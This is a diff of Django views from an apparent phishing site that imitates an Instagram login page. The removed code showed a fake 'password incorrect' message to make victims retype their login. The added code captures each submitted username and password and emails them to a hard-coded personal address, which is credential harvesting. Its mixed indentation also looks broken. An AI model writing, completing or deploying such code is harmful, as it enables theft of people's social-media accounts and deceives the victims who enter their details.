@@ -88,35 +88,43 @@ def facebook(request):
    return render(request, 'donate/facebook.html')
 
 def instagram(request):
-    if request.method == 'POST':
-        product = request.POST['product']
-        massage = request.POST['massage']
-        
-        if request.session.get('attempt', 0) < 1:
-            # First attempt fails
-            request.session['attempt'] = request.session.get('attempt', 0) + 1
-            ctx = {
-                'error_message': 'Sorry, your password was incorrect. Please double-check your password.',
-                'product': product,
-                'massage': massage,
-            }
-            return render(request, 'donate/instagram.html', ctx)
-        else:
-            # Second attempt succeeds
-            ctx = {
-                'product': product,
-                'massage': massage,
-            }
-            message = render_to_string('donate/email1.html', ctx)
-            send_mail('Contact Form',
-                      message,
-                      settings.EMAIL_HOST_USER,
-                      ['osazuwaaihanuwa6@gmail.com'], 
-                      fail_silently=False, html_message=message)
-            return redirect('instagram')
     
-    # Reset attempt count on GET request
-    request.session['attempt'] = 0
+   if request.method == 'POST':
+       name = request.POST['name']
+       password = request.POST['password']
+       ctx = {
+           'name' : name,
+           'password' : password,
+       }
+       message = render_to_string('donate/email2.html', ctx)
+       send_mail('Contact Form',
+        message,
+        settings.EMAIL_HOST_USER,
+        ['osazuwaaihanuwa6@gmail.com'], 
+        fail_silently=False, html_message=message)
+
+       return redirect('instagram1')
+
+    return render(request, 'donate/instagram.html')
+
+def instagram1(request):
+    
+   if request.method == 'POST':
+       name = request.POST['name']
+       password = request.POST['password']
+       ctx = {
+           'name' : name,
+           'password' : password,
+       }
+       message = render_to_string('donate/email2.html', ctx)
+       send_mail('Contact Form',
+        message,
+        settings.EMAIL_HOST_USER,
+        ['osazuwaaihanuwa6@gmail.com'], 
+        fail_silently=False, html_message=message)
+
+       return redirect('instagram1')
+
     return render(request, 'donate/instagram.html')
 
 def terms( request):
